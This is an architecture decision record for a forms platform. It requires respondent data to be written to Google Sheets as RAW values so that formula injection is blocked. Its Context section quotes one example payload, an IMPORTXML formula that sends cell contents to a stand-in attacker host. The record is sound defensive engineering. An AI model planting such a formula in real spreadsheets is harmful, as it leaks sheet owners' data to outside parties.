# 0002. Write respondent data with `RAW` value input only

Date: 2026-10-16

## Status

Accepted

## Context

With `valueInputOption=USER_ENTERED`, Google Sheets parses input as if a person typed it, so a value such as `=IMPORTXML("https://attacker.example/?"&A1, "//a")` becomes a live formula in the owner's spreadsheet. A respondent could exfiltrate other cells or trigger requests from the owner's sheet (formula / CSV injection).

## Decision

- Every value that originates from a respondent is written with `valueInputOption=RAW`.
- `USER_ENTERED` may only be used for values fully generated by the platform, and only with a documented reason.
- The rule is enforced in the Google client package (a single write path), with tests that attempt formula payloads.

## Consequences

- Numbers and dates entered by respondents arrive as text unless the platform converts them deliberately. Typed conversion for numeric and date fields is done by the platform from the validated schema type, never by Sheets parsing respondent text.
- CSV exports (if added) must apply the same protection (prefixing dangerous leading characters).
